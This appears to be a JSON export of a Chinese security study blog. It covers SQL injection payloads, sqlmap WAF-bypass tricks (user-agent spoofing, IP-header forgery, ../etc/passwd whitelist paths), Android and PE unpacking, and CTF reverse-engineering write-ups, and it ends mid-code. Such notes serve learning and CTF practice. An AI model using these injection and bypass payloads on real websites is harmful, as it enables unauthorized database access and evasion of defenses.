反编译查找源码漏洞，难度极大 # 无 web # 有无其他 # 资产信息 # 各种平台查询 # whois 备案 根据已知域名反差，分析出此域名的注册人，邮箱，电话等 工具：爱站网、站长工具、微步在线（https://x.threatbook.cn）、site.ip138.com、searchdns.netcraft.com、国外 whois 信息查询网址：https://who.is # github 监控 # 第三方应用 # 数据库应用 # 各种监管平台 # 第三方应用 # 服务接口 支付接口 储存服务 内部服务 # 微信公众号 涉及 web 涉及 app 其他 # 内部群 qq / 微信群 钉钉 / 工作群 其他","tags":["sql注入"],"categories":["笔记"]},{"title":"sql注入","path":"/2024/03/28/sql注入/","content":"# 基本语句 备忘 1234567891011table_schema:库名table_name:表名column_name:列名union select 1,2,3,4union select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema=&#x27;database()&#x27;union select 1,group_concat(column_name),3,4 from information_schema.columns where table_name=&#x27;tablename&#x27;union select 1,name,password,4 from database() # 函数 # 截取函数 12345left（‘admin’,1）:左截取，从左边截取admin字符串，截取一位。right（&#x27;admin&#x27;,1）：右截取mid（&#x27;admin&#x27;,1,2）：截取admin字符串，从第一位开始截取，截取两位substr（&#x27;str&#x27;,pos）：截取从pos位置开始到最后的所有str字符串substring（&#x27;str&#x27;,pos,len）： str 为列名 / 字符串 pos 为起始位置；mysql 中的起始位置 pos 是从 1 开始的；如果为正数，就表示从正数的位置往下截取字符串（起始坐标从 1 开始），反之如果起始位置 pos 为负数，那么 表示就从倒数第几个开始截取 len 为截取字符个数 / 长度。 # 判断函数 12if（1=1，1，0）:case when 1=1 then 0 else 1 end: # 报错函数 123updatexml(1,concat(0x7e,注入语句,0x7e),1)=1id=1&#x27;and updatexml(1,concat(0x7e,mid((select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;),31,32),0x7e),1)=&#x27;1 # 提交方式 get，post，cookie，request，http 头等 # 数据类型 数字型，字符型，搜索型 # 查询方法 select，insert，delete，update，order by # 回显、盲注 回显注入，无回显注入，延时注入，布尔注入 # 数据库类型 不同的数据库注入语法略有不同 # 扩展 加解密注入，json 注入，ladp 注入，dnslog 注入，二次注入，堆叠查询，文件读写 # JSON 注入 JSON 是独特的储存数据形式 12345curl -X POST https://api.zoomeye.org/user/login -d&#123; &quot;username&quot;: &quot;foo@bar.com&quot;, &quot;password&quot;: &quot;foobar&quot;&#125; 注入点就可以在 foobar 后面 1&quot;username&quot;: &quot;foo@bar.com&#x27; and 1=1#&quot;","tags":["sql注入"],"categories":["笔记"]},{"title":"sql注入之waf绕过","path":"/2024/03/27/sql注入之waf绕过/","content":"# sqlmap 绕过 waf # 流量拦截 因为 sqlmap 的扫描速度很快，可能会被网站的流量监控给拦截，我们可以用时间函数或者代理池解决 # 时间函数 1python sqlmap.py -u &quot;url&quot; --delay 1 # 代理池 # 请求头拦截 sqlmap 在注入时，请求头被检测到就会被屏蔽，我们可以用随机 user-agent 或者搜索引擎的请求头 1python sqlmap.py -u &quot;url&quot; --random-agent 可以自定义请求头比如用百度的请求头，因为搜索引擎收录站点也是用爬虫爬取的，所以一般的网站不会屏蔽搜索引擎的请求头 1python sqlmap.py -u &quot;url&quot; --user-agent=&quot;Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)&quot; 扩展 1：有些 WAF 它拦截的可能是其他字段，可以使用 burp 抓包替换这个字段来进行绕过 扩展 2：将注入语句写在 txt 文件中，放在 sqlmap 目录下跑 # 关键字替换 通过 tamper 模块的绕过脚本，将容易被屏蔽的关键字替换，sqlmap 自带很多脚本在 sqlmap/tamper 目录下 1python sqlmap.py -u &quot;url&quot; --tamper 模块名，模块名... # IP 白名单 当网站获取 ip 的方式为获取客户端的 ip 的话，就有可能存在伪造 i 绕过的情况，但从网络层获取 ip 的就没这个可能 方法：修改 http 的 header 12345x-forwarded-forx-remote-IPx-originating-IPx-remote-addrx-Real-ip # 静态资源 特定的静态资源后缀请求，常见的静态文件 (.js .jpg .swf .css 等等)，类似白名单机制，waf 为了检测效率，不去检测这样一些静态文件名后缀的请求。 12http://10.9.9.201/ sql.php?id=1http://10.9.9.201/sql.php/1.js?id=1 备注: Aspx/php 只识别到前面的，.aspx/.php 后面基本不识别 # url 白名单 为了防止误拦，部分 waf 内置默认的白名单列表，如 admin/manager/system 等管理后台。只要 url 中存在白名单的字符串，就作为白名单不进行检测。常见的 url 构造姿势: 123http://10.9.9.201/sql.php/admin.php?id=1http://10.9.9.201/sql.php?a=/manage/&amp;b=../etc/passwdhttp://10.9.9.201/../../../ manage/../sql.asp?id=2 waf 通过 /manage/ 进行比较，只要 url 中存在 /manage/ 就作为白名单不进行检测，这样我们可以通过 /sql.php?a=/manage/&amp;b=…/etc/passwd 绕过防御规则 # 爬虫白名单 通过伪造各大搜索引擎的请求头来绕过 waf 部分 waf 有提供爬虫白名单（各大浏览器的爬虫）的功能，识别爬虫的技术一般有两种: 1、根据 useragent 2、通过行为来判断 UserAgent 可以很容易欺骗，我们可以伪装成爬虫尝试绕过。User Agent switcher (Firefox 附加组件)，下载地址: https://addons.mozilla.org/en-us/firefox/addon/user-agent-switcher/ # 数据替换 大小写，加解密，编码，等价函数，特殊符号，反序列化，注释符混用 # 其他 # Fuzz # 垃圾数据溢出 # http 参数污染 如果出现多个相同参数，不同的服务器搭建网站会出现参数接受的差别，从而令原有的参数失效 web 服务器 参数获取函数 获取到的参数 PHP/Apache $_GET(“par”) last JSP/Tomcat Request.getParameter(“par”) first Perl(CGI)/Apache Param(“par”) first Python/Apache Getvalue(“par”) all(list) ASP/IIS Request.QueryString(“par”) all # 数据库特性","tags":["sql注入"],"categories":["笔记"]},{"title":"ESP定律——脱壳","path":"/2022/09/01/ESP定律——脱壳/","content":"# OEP OEP 是程序的入口点，软件加了壳就是隐藏了 OEP 或是用了假的 OEP，以达到保护程序的目的，只要我们可以找到程序的真正的 OEP 就可以脱壳，pushad（压栈）是代表程序的入口点，popad（出栈）代表程序的出口点，与 pushad 相对应，找到 popad，oep 一般就在这附近 # ESP 定律步骤 1、首先 F8（一般刚进去的时候会在 pushad 附近），然后观察右上角寄存器中 ESP 有没有突变成红色，如果变成红色就进行接下来的步骤 2、在底下的命令行输入指令 dd XXXXXXX 或 hr XXXXXXX (即当前 ESP 的地址)，然后回车（也可以直接右键跟随） 3、选中刚刚下断点的地址，右键选择断点 ——&gt; 硬件访问 ——&gt;word 断点，英文 breakpoint——&gt;hardware,on access——&gt;word 4、F9 运行到跳转出，F8 到达程序 OEP 5、用自带插件 olly dump 保存文件 # 注意事项 我在用 esp 定律脱壳的时候，第一次用 OD 是可以正常脱壳的，但后面不知道为什么，一直会弹出一个 “无法读取被调用程序的内存” 的提示，无法脱壳，然后我在网上找了很多方法，也有很多我还不理解的，但有一个比较方便的方法是可以用的，就是用虚拟机，用 windows xp 的虚拟机运行 OD 就可以正常脱壳了，不过在本机上为什么不能脱壳，我还不知道是什么原因，欢迎大佬指点 # 其他脱壳方法 ESP 定律脱壳只是手动脱壳其中一个方法，想更深层次理解 ESP 定律或学习其他方法可以看这个博客：ESP 定理如何判断找出 OEP 【OEP 脱壳的 5 种方法】","tags":["reverse"],"categories":["笔记"]},{"title":"NepCTF2022","path":"/2022/08/11/NepCTF2022/","content":"# Reverse # 快来签到 打开 ida 之后报错，提示 The graph is too big，我们在 general 里面把 Max number of nodes 改成 999999 就就可以看到了 NepCTF{welc0me_t0_nepctf} # We_can_go 直接看关键函数 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960int sub_719630()&#123; int i; // edx int result; // eax _DWORD *v2; // [esp+4h] [ebp-60h] _BYTE *v3; // [esp+Ch] [ebp-58h] int v4; // [esp+10h] [ebp-54h] char v5[32]; // [esp+20h] [ebp-44h] BYREF _DWORD *v6; // [esp+40h] [ebp-24h] int v7[2]; // [esp+44h] [ebp-20h] BYREF int v8[2]; // [esp+4Ch] [ebp-18h] BYREF int v9[2]; // [esp+54h] [ebp-10h] BYREF int v10[2]; // [esp+5Ch] [ebp-8h] BYREF void *retaddr; // [esp+64h] [ebp+0h] BYREF if ( &amp;retaddr &lt;= *(*NtCurrentTeb()-&gt;NtTib.ArbitraryUserPointer + 8) ) sub_6D82C0(); sub_68AC70(&amp;unk_7233C0); v6 = v2; v2[1] = 0; *v2 = 0; v10[0] = &amp;unk_7200A0; v10[1] = v2; sub_713D80(&amp;off_7525B8, dword_7CB200, v10, 1, 1); sub_6C79B0(v5, *v6, v6[1]); if ( v4 == &#x27;\\x17&#x27; &amp;&amp; *v3 == &#x27;N&#x27; &amp;&amp; v3[1] == &#x27;e&#x27; &amp;&amp; v3[2] == &#x27;p&#x27; &amp;&amp; v3[3] == &#x27;C&#x27; &amp;&amp; v3[4] == &#x27;T&#x27; &amp;&amp; v3[5] == &#x27;F&#x27; &amp;&amp; v3[6] == &#x27;&#123;&#x27; &amp;&amp; v3[22] == &#x27;&#125;&#x27; ) &#123; for ( i = 0; i &lt; 15; ++i ) &#123; if ( i &gt;= dword_7CB6E4 ) sub_6D9750(); if ( i + 7 &gt;= &#x27;\\x17&#x27; ) sub_6D9750(); if ( v3[i + 7] != *(dword_7CB6E0 + i) ) &#123; v8[0] = &amp;unk_7233C0; v8[1] = &amp;off_752334; return sub_70D8C0(&amp;off_7525CC, dword_7CB204, v8, 1, 1); &#125; &#125; v7[0] = &amp;unk_7233C0; v7[1] = &amp;off_75233C; result = sub_70D8C0(&amp;off_7525CC, dword_7CB204, v7, 1, 1); &#125; else &#123; v9[0] = &amp;unk_7233C0; v9[1] = &amp;off_752334; result = sub_70D8C0(&amp;off_7525CC, dword_7CB204, v9, 1, 1); &#125; return result;&#125; 42 行的判断是关键语句，dword_7CB6E0 就是我们需要的数据，在这里下一个断点，动调一下就可以看到 NepCTF{U9eT_t0_th3TRUE}","tags":["reverse"],"categories":["wp"]},{"title":"如何脱bang壳","path":"/2022/08/07/如何脱bang壳/","content":"今天遇到一个加了壳的安卓题，[网鼎杯 2020 青龙组] bang，这是我第一次遇见加壳的 apk 程序，加了 bang 这个壳，第一次去这种壳所以记录一下，以免以后忘记 这里首先使用 PKID 这个工具来查壳，在网上可以搜到，然后就可以看到 然后就要用到 frida-dexdeump 脚本来脱壳，在使用这个脚本之前，还要在连接安卓系统的条件下使用，在这里还要配置一下 frida 的环境 # 第一步，在 windows 下安装 frida 模块和 frida-tools 模块 先安装 frida 模块 1pip install frida 然后安装 frida-tools 模块 1pip install frida-tools 在安装完之后，要将他们所在的路径添加到环境变量中，否则无法使用 frida 指令 # 第二步，安卓系统下安装 frida-server 要与安卓系统进行连接，首先要在安卓系统中安装 frida-server，可以看到这里有很多版本 我们要选择与我们刚才在 windows 下 pip 安装的 frida 相对应的版本进行安装，同时还要看你所使用的安卓系统的架构，比如我安装的 frida 是 15.2.2 版本的，而且我用的安卓系统是 64 位的，那我就选择 frida-server-15.2.2-android-x86_64.xz，然后我们就要把它安装进安卓系统中 # 连接安卓系统 连接安卓系统需要用到 adb 指令，下载解压之后将其路径添加到环境变量中就可以使用了，然后打开 cmd，输入下面的命令进行传输 1adb push (frida-server在windows中的路径) /data/local/tmp(这个是安卓系统的目标路径) 输入完之后可能要等个一两分钟才传输完成，完成之后就可以进行连接了，我用的安卓系统是 mumu 模拟器的，可以在模拟器里面看自己的地址，输入以下命令连接 1adb connect 127.0.0.1:7555 连接成功 然后通过以下命令进入 frida-server 所在目录 123adb shellsucd /data/local/tmp 先给文件权限 1chmod 777 frida-server-15.2.2(文件名) 再打开 1./frida-server-15.2.2 然后我们再打开一个新的 cmd 输入 1frida-ps -U 以此来确认该程序有没有打开成功 这就说明打开成功了 # 第三步，脚本脱壳 在安卓端打开 frida-server 之后，我们再在安卓端把要脱壳的程序给打开，就可以在 windows 下进行脱壳了，我们在刚刚下好的 frida-dexdump 目录下打开 cmd，输入下面的命令 1frida-dexdump -FU 然后在此目录下会出现一个跟被脱壳程序同名的文件，里面有两个 把第一个文件拿到 jeb 中打开，可以直接看到 flag 得到 flag {borring_things}","tags":["reverse"],"categories":["笔记"]},{"title":"DASCTF2022-7月-隐秘的角落","path":"/2022/07/31/DASCTF2022-7月-隐藏的角落/","content":"# 主函数 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354void __cdecl main_main()&#123; __int64 v0; // rdx int v1; // edi __int64 v2; // rsi int v3; // edx int v4; // ecx __int64 v5; // r8 __int64 v6; // r9 __int64 v7; // r8 __int64 v8; // r9 __int64 v9; // r8 __int64 v10; // r9 int v11; // er8 int v12; // er9 int v13; // edx __int64 v14; // r8 __int64 v15; // r9 int v16; // edx int v17; // ecx __int64 v18; // r8 __int128 v19; // [rsp+58h] [rbp-38h] BYREF __int128 v20; // [rsp+68h] [rbp-28h] BYREF void *v21; // [rsp+78h] [rbp-18h] BYREF void **v22; // [rsp+80h] [rbp-10h] BYREF if ( &amp;v22 &lt;= *(__readfsqword(0xFFFFFFF8) + 16) ) runtime_morestack_noctxt(); sync___WaitGroup__Add(v1, v2, v0); runtime_newobject(v1, v2, v3, v4, v5, v6); v21 = &amp;unk_4B0DA0; v22 = &amp;off_4E9BB0; fmt_Fprintln(v1, v2, &amp;v21, &amp;unk_4B0DA0, v7, v8, &amp;go_itab__os_File_io_Writer, os_Stdout, &amp;v21); *&amp;v20 = &amp;unk_4AE9C0; *(&amp;v20 + 1) = 1LL; fmt_Fscanf( v1, v2, &amp;go_itab__os_File_io_Reader, &amp;v20, v9, v10, &amp;go_itab__os_File_io_Reader, os_Stdin, &amp;unk_4C9DA5, 2LL, &amp;v20, 1LL); runtime_newproc(v1, v2, &amp;off_4D2310, MEMORY[1], v11, v12, 16, &amp;off_4D2310, MEMORY[1], MEMORY[9]); *&amp;v19 = &amp;unk_4B0DA0; *(&amp;v19 + 1) = &amp;off_4E9BC0; fmt_Fprintln(v1, v2, v13, &amp;go_itab__os_File_io_Writer, v14, v15, &amp;go_itab__os_File_io_Writer, os_Stdout, &amp;v19); sync___WaitGroup__Wait(v1, v2, v16, v17, v18);&#125; 其中 runtime_newproc 函数代表启动了另一个线程来执行函数，交叉引用可以发现引用的是 main_checkflag 函数，后面的数组比如 &amp; off_4E9BC0 就是提示语，在 linux 中打开之后输入 flag 会提示’Who am I? where am I? what am I doing?’，不过我们先不用管这个，先看关键函数 # main_checkflag 123456789101112131415161718192021222324252627282930313233343536373839404142434445__int64 __fastcall main_checkflag(int a1, __int64 a2, int a3, __int64 a4, int a5, int a6, __int64 a7, __int64 a8)&#123; unsigned __int64 v8; // rcx __int64 v9; // r8 __int64 v10; // r9 int v11; // edx char v12; // al __int64 v13; // rdx int v15; // [rsp+18h] [rbp-70h] __int64 v16; // [rsp+20h] [rbp-68h] int v17; // [rsp+28h] [rbp-60h] char v18[32]; // [rsp+40h] [rbp-48h] BYREF __int128 v19; // [rsp+60h] [rbp-28h] BYREF __int128 v20; // [rsp+70h] [rbp-18h] BYREF __int64 v21; // [rsp+80h] [rbp-8h] BYREF v8 = __readfsqword(0xFFFFFFF8); if ( &amp;v21 &lt;= *(v8 + 16) ) runtime_morestack_noctxt(); runtime_stringtoslicebyte(a1, a2, a3, v8, a5, a6, v18, a7, a8); main_Myencode(a1, a2, v17, v16); v11 = v15; if ( v16 == qword_55EA78 ) &#123; runtime_memequal(a1, a2, v15, main_enc, v9, v10); v12 = v15; &#125; else &#123; v12 = 0; &#125; if ( v12 ) &#123; *&amp;v20 = &amp;unk_4B0DA0; *(&amp;v20 + 1) = &amp;off_4E9B90; fmt_Fprintln(a1, a2, v11, &amp;go_itab__os_File_io_Writer, v9, v10, &amp;go_itab__os_File_io_Writer, os_Stdout, &amp;v20); &#125; else &#123; *&amp;v19 = &amp;unk_4B0DA0; *(&amp;v19 + 1) = &amp;off_4E9BA0; fmt_Fprintln(a1, a2, v11, &amp;go_itab__os_File_io_Writer, v9, v10, &amp;go_itab__os_File_io_Writer, os_Stdout, &amp;v19); &#125; return sync___WaitGroup__Add(a1, a2, v13);&#125; 这个函数出现了一个 main_Myencode，看名字就觉得是个关键函数，再看后面也有一个类似刚才的数组，然后我们点进去看，发现一个关键信息 说明 flag 是我们输入的字符串的 md5 值，现在看 main_Myencode 函数 # main_Myencode 12345678910111213141516171819202122232425__int64 __fastcall main_Myencode(int a1, int a2, int a3, _DWORD a4, int a5, int a6, __int64 a7, __int64 a8, int a9)&#123; unsigned __int64 v9; // rcx int v10; // er8 int v11; // er9 __int64 v12; // r8 int v13; // er8 int v14; // er9 __int64 v16; // [rsp+18h] [rbp-50h] int v17; // [rsp+20h] [rbp-48h] int v18; // [rsp+28h] [rbp-40h] char v19[32]; // [rsp+38h] [rbp-30h] BYREF __int64 v20; // [rsp+58h] [rbp-10h] void *retaddr; // [rsp+68h] [rbp+0h] BYREF v9 = __readfsqword(0xFFFFFFF8); if ( &amp;retaddr &lt;= *(v9 + 16) ) runtime_morestack_noctxt(); runtime_makeslice(a1, a2, a3, v9, a5, a6, &amp;unk_4B0EE0, a8, a8); v20 = v16; runtime_stringtoslicebyte(a1, a2, qword_55E898, main_enc_key, v10, v11, v19, main_enc_key, qword_55E898); crypto_rc4_NewCipher(a1, a2, v18, v17, v12); crypto_rc4___Cipher__XORKeyStream(a1, a2, a9, a8, v13, v14); return a8;&#125; 看到了两个 rc4 加密的函数，说明这里是将输入的字符串进行了 rc4 加密，并且可以看到 21 行这里看到有一个 main_enc_key，这应该就是密钥了，可以直接看到它的值 &quot;thisiskkk&quot;，然后在这里突然又想起在外面那个函数也看到一个类似这个的东西，就是 main_enc，然后点进去看发现是个数组，这刚好和密钥的名字对应，肯定就是加密后的结果了 12340xD8, 0xE5, 0x85, 0xBE, 0xE7, 0xF8, 0x58, 0x75, 0x95, 0x65, 0x85, 0xE3, 0xA6, 0x47, 0x59, 0xB9, 0x14, 0x6F, 0x33, 0xB5, 0xCA, 0x84, 0x0B, 0xE7, 0x92, 0x0E, 0xD2, 0xFD, 0x64, 0x18, 0x96, 0xD0, 0x0F, 0x5E, 0x44, 0x3E 不过这不是最终的加密结果，一开始没有发现，最后这一串还异或了一个 0x23，在 ida 左侧的函数栏里面还有一个带有 main 的函数 main_init_0，在这个里面又将 rc4 后的结果进行了一次异或，所以虽然说名字像不一定是百分百有联系，但还是看一下比较好，官方的 wp 说还可以通过动调来直接找这个最终的密文，一开始也尝试了动调，但我是直接用 ida 的远程调试的，搞了很久没搞出来，可以用 gdb 调试，但 dlv 会更方便（不会 dlv） # 总体思路 程序将输入的字符串进行一次 rc4 加密再进行一次异或，我们只要先异或再解密就行了，知道了 key 和密文，再 rc4 解密一下就行了，解密脚本用的是一位大佬写的，解密之后得到 56e83694-f976-11eb-b343-faffc201c8e0，在 linux 中运行程序的时候，输入这个字符串，也会弹出提示，最终的 flag 是 DASCTF {md5 (Input)}，所以在程序的分析中没有发现这个也是没问题的 得到 flag：DASCTF{9e1963bbbb1285b993c862a5a6f12604}","tags":["reverse"],"categories":["wp"]},{"title":"RoarCTF2019-polyre","path":"/2022/07/22/RoarCTF2019-polyre/","content":"这道题刚打开看它的主函数的时候，看到它的控制流程图 而且主函数的代码也是一个非常长的循环，我们需要对它进行控制流平坦化，这里我是在 kali 中用 deflat.py 脚本操作的 平坦化之后就可以看正常的代码了 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143__int64 __fastcall main(int a1, char **a2, char **a3)&#123; signed __int64 v4; // [rsp+1E0h] [rbp-110h] int i; // [rsp+1E8h] [rbp-108h] int v6; // [rsp+1ECh] [rbp-104h] int v7; // [rsp+1ECh] [rbp-104h] char s1[48]; // [rsp+1F0h] [rbp-100h] BYREF char s[60]; // [rsp+220h] [rbp-D0h] BYREF unsigned int v10; // [rsp+25Ch] [rbp-94h] char *v11; // [rsp+260h] [rbp-90h] int v12; // [rsp+26Ch] [rbp-84h] bool v13; // [rsp+272h] [rbp-7Eh] unsigned __int8 v14; // [rsp+273h] [rbp-7Dh] int v15; // [rsp+274h] [rbp-7Ch] char *v16; // [rsp+278h] [rbp-78h] int v17; // [rsp+284h] [rbp-6Ch] int v18; // [rsp+288h] [rbp-68h] bool v19; // [rsp+28Fh] [rbp-61h] char *v20; // [rsp+290h] [rbp-60h] int v21; // [rsp+298h] [rbp-58h] bool v22; // [rsp+29Fh] [rbp-51h] __int64 v23; // [rsp+2A0h] [rbp-50h] bool v24; // [rsp+2AFh] [rbp-41h] __int64 v25; // [rsp+2B0h] [rbp-40h] __int64 v26; // [rsp+2B8h] [rbp-38h] __int64 v27; // [rsp+2C0h] [rbp-30h] __int64 v28; // [rsp+2C8h] [rbp-28h] int v29; // [rsp+2D0h] [rbp-20h] int v30; // [rsp+2D4h] [rbp-1Ch] char *v31; // [rsp+2D8h] [rbp-18h] int v32; // [rsp+2E0h] [rbp-10h] int v33; // [rsp+2E4h] [rbp-Ch] bool v34; // [rsp+2EBh] [rbp-5h] v10 = 0; memset(s, 0, 0x30uLL); memset(s1, 0, sizeof(s1)); printf(&quot;Input:&quot;); v11 = s; if ( dword_603058 &gt;= 10 &amp;&amp; (((dword_603054 - 1) * dword_603054) &amp; 1) != 0 ) goto LABEL_43; while ( 1 ) &#123; __isoc99_scanf(&quot;%s&quot;, v11); v6 = 0; if ( dword_603058 &lt; 10 || (((dword_603054 - 1) * dword_603054) &amp; 1) == 0 ) break;LABEL_43: __isoc99_scanf(&quot;%s&quot;, v11); &#125; while ( 1 ) &#123; do v12 = v6; while ( dword_603058 &gt;= 10 &amp;&amp; (((dword_603054 - 1) * dword_603054) &amp; 1) != 0 ); v13 = v12 &lt; 64; while ( dword_603058 &gt;= 10 &amp;&amp; (((dword_603054 - 1) * dword_603054) &amp; 1) != 0 ) ; if ( !v13 ) break; v14 = s[v6]; do v15 = v14; while ( dword_603058 &gt;= 10 &amp;&amp; (((dword_603054 - 1) * dword_603054) &amp; 1) != 0 ); if ( v15 == 10 ) &#123; v16 = &amp;s[v6]; *v16 = 0; break; &#125; v17 = v6 + 1; do v6 = v17; while ( dword_603058 &gt;= 10 &amp;&amp; (((dword_603054 - 1) * dword_603054) &amp; 1) != 0 ); &#125; for ( i = 0; ; ++i ) &#123; do v18 = i; while ( dword_603058 &gt;= 10 &amp;&amp; (((dword_603054 - 1) * dword_603054) &amp; 1) != 0 ); do v19 = v18 &lt; 6; while ( dword_603058 &gt;= 10 &amp;&amp; (((dword_603054 - 1) * dword_603054) &amp; 1) != 0 ); if ( !v19 ) break; do v20 = s; while ( dword_603058 &gt;= 10 &amp;&amp; (((dword_603054 - 1) * dword_603054) &amp; 1) != 0 ); v4 = *&amp;v20[8 * i]; v7 = 0; while ( 1 ) &#123; v21 = v7; do v22 = v21 &lt; 64; while ( dword_603058 &gt;= 10 &amp;&amp; (((dword_603054 - 1) * dword_603054) &amp; 1) != 0 ); if ( !v22 ) break; v23 = v4; v24 = v4 &lt; 0; if ( v4 &gt;= 0 ) &#123; v27 = v4; do v28 = 2 * v27; while ( dword_603058 &gt;= 10 &amp;&amp; (((dword_603054 - 1) * dword_603054) &amp; 1) != 0 ); v4 = v28; &#125; else &#123; v25 = 2 * v4; do v26 = v25; while ( dword_603058 &gt;= 10 &amp;&amp; (((dword_603054 - 1) * dword_603054) &amp; 1) != 0 ); v4 = v26 ^ 0xB0004B7679FA26B3LL; &#125; v29 = v7; do v7 = v29 + 1; while ( dword_603058 &gt;= 10 &amp;&amp; (((dword_603054 - 1) * dword_603054) &amp; 1) != 0 ); &#125; v30 = 8 * i; v31 = &amp;s1[8 * i]; if ( dword_603058 &gt;= 10 &amp;&amp; (((dword_603054 - 1) * dword_603054) &amp; 1) != 0 )LABEL_55: *v31 = v4; *v31 = v4; if ( dword_603058 &gt;= 10 &amp;&amp; (((dword_603054 - 1) * dword_603054) &amp; 1) != 0 ) goto LABEL_55; v32 = i + 1; &#125; do v33 = memcmp(s1, &amp;unk_402170, 0x30uLL); while ( dword_603058 &gt;= 10 &amp;&amp; (((dword_603054 - 1) * dword_603054) &amp; 1) != 0 ); v34 = v33 != 0; while ( dword_603058 &gt;= 10 &amp;&amp; (((dword_603054 - 1) * dword_603054) &amp; 1) != 0 ) ; if ( v34 ) puts(&quot;Wrong!&quot;); else puts(&quot;Correct!&quot;); return v10;&#125; 但实际上这还是挺长的，不过这里面有很多重复的无用语句可以删掉，官方的 wp 也有一个脚本可以简化代码，我就直接看简化后的代码了 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899__int64 __fastcall main(__int64 a1, char **a2, char **a3)&#123; signed __int64 v4; // [rsp+1E0h] [rbp-110h] signed int j; // [rsp+1E8h] [rbp-108h] signed int i; // [rsp+1ECh] [rbp-104h] signed int k; // [rsp+1ECh] [rbp-104h] char s1[48]; // [rsp+1F0h] [rbp-100h] char s[60]; // [rsp+220h] [rbp-D0h] unsigned int v10; // [rsp+25Ch] [rbp-94h] char *v11; // [rsp+260h] [rbp-90h] int v12; // [rsp+26Ch] [rbp-84h] bool v13; // [rsp+272h] [rbp-7Eh] unsigned __int8 v14; // [rsp+273h] [rbp-7Dh] int v15; // [rsp+274h] [rbp-7Ch] char *v16; // [rsp+278h] [rbp-78h] int v17; // [rsp+284h] [rbp-6Ch] int v18; // [rsp+288h] [rbp-68h] bool v19; // [rsp+28Fh] [rbp-61h] char *v20; // [rsp+290h] [rbp-60h] int v21; // [rsp+298h] [rbp-58h] bool v22; // [rsp+29Fh] [rbp-51h] __int64 v23; // [rsp+2A0h] [rbp-50h] bool v24; // [rsp+2AFh] [rbp-41h] __int64 v25; // [rsp+2B0h] [rbp-40h] __int64 v26; // [rsp+2B8h] [rbp-38h] __int64 v27; // [rsp+2C0h] [rbp-30h] __int64 v28; // [rsp+2C8h] [rbp-28h] int v29; // [rsp+2D0h] [rbp-20h] int v30; // [rsp+2D4h] [rbp-1Ch] char *v31; // [rsp+2D8h] [rbp-18h] int v32; // [rsp+2E0h] [rbp-10h] int v33; // [rsp+2E4h] [rbp-Ch] bool v34; // [rsp+2EBh] [rbp-5h] v10 = 0; memset(s, 0, 0x30uLL); memset(s1, 0, 0x30uLL); printf(&quot;Input:&quot;, 0LL); v11 = s; __isoc99_scanf(&quot;%s&quot;, s, (dword_603054 - 1), 3788079310LL); for ( i = 0; ; ++i ) &#123; v12 = i; v13 = i &lt; 64; if ( i &gt;= 64 ) break; v14 = s[i]; v15 = v14; if ( v14 == 10 ) &#123; v16 = &amp;s[i]; *v16 = 0; break; &#125; v17 = i + 1; &#125; for ( j = 0; ; ++j ) &#123; v18 = j; v19 = j &lt; 6; if ( j &gt;= 6 ) break; v20 = s; v4 = *&amp;s[8 * j]; for ( k = 0; ; ++k ) &#123; v21 = k; v22 = k &lt; 64; if ( k &gt;= 64 ) break; v23 = v4; v24 = v4 &lt; 0; if ( v4 &gt;= 0 ) &#123; v27 = v4; v28 = 2 * v4; v4 *= 2LL; &#125; else &#123; v25 = 2 * v4; v26 = 2 * v4; v4 = 2 * v4 ^ 0xB0004B7679FA26B3LL; &#125; v29 = k; &#125; v30 = 8 * j; v31 = &amp;s1[8 * j]; *v31 = v4; v32 = j + 1; &#125; v33 = memcmp(s1, &amp;unk_402170, 0x30uLL); v34 = v33 != 0; if ( v33 != 0 ) puts(&quot;Wrong!&quot;); else puts(&quot;Correct!&quot;); return v10;&#125; 简化后再看它的逻辑就比较清晰了，先是输入一串长为 0x30 也就是 48 的字符串，将每八个字节分为一组一共六组，然后取每一组的首个数据进行正负判断，如果是正就乘 2 也就是左移一位，为负也是左移一位但还要进行一次异或运算，一共循环 64 次，这个是用 CRC32 算法来取得一个查表法所用的表，而在后面还有一次 CRC64 的加密，这里我还不是很懂，只能搞出这个表，看网上的 wp 最后一步都要再右移八位，这个应该就是 CRC64 的操作了，最后在和 &amp; unk_402170 进行对比，这个就是最后的数据了，脚本如下 12345678910111213141516171819202122a = [0xBC8FF26D43536296, 0x520100780530EE16, 0x4DC0B5EA935F08EC, 0x342B90AFD853F450, 0x8B250EBCAA2C3681, 0x55759F81A2C68AE4]flag = &#x27;&#x27;for s in a: for i in range(64): b = s &amp; 1 if b == 1: s ^= 0xB0004B7679FA26B3 s //= 2 if b == 1: s |= 0x8000000000000000 print(s) j = 0 while j &lt; 8: flag += chr(s &amp; 0xFF) s &gt;&gt;= 8 j += 1print(flag) 得到 flag {6ff29390-6c20-4c56-ba70-a95758e3d1f8}","tags":["reverse"],"categories":["wp"]},{"title":"GUETCTF2019-encrypt","path":"/2022/07/21/GUETCTF2019-encrypt/","content":"这道题的总体思路还是比较清晰的，没有搞一些乱七八糟的东西来混淆我们，它就是用三个函数对输入的 flag 进行加密之后，再和 byte_602080 对比 # 主函数 1234567891011121314151617181920212223242526272829303132333435363738394041424344__int64 __fastcall main(int a1, char **a2, char **a3)&#123; int v3; // eax int v4; // eax char v6[4]; // [rsp+4h] [rbp-93Ch] BYREF int i; // [rsp+8h] [rbp-938h] int v8; // [rsp+Ch] [rbp-934h] _DWORD v9[260]; // [rsp+10h] [rbp-930h] BYREF char v10[16]; // [rsp+420h] [rbp-520h] BYREF char s[256]; // [rsp+430h] [rbp-510h] BYREF char v12[1032]; // [rsp+530h] [rbp-410h] BYREF unsigned __int64 v13; // [rsp+938h] [rbp-8h] v13 = __readfsqword(0x28u); v10[0] = 16; v10[1] = 32; v10[2] = 48; v10[3] = 48; v10[4] = 32; v10[5] = 32; v10[6] = 16; v10[7] = 64; memset(s, 0, sizeof(s)); v8 = strlen(s); memset(v12, 0, 0x400uLL); printf(&quot;please input your flag:&quot;); scanf(&quot;%s&quot;, s); memset(v9, 0, 0x408uLL); sub_4006B6(v9, v10, 